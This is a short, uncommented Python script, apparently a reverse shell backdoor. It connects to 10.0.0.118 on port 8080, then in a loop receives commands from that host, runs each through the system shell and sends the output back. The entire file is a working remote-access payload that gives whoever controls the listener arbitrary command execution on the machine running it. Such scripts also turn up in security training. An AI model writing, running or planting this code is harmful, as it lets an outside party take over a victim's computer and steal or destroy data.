#!/usr/bin/env python

import socket
import subprocess

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.0.118", 8080))

connection.send("\n[+] connection started.\n")

while True:
    command = connection.recv(1025)
    command_result = execute_system_command(command)
    connection.send(command_result)

connection.close()
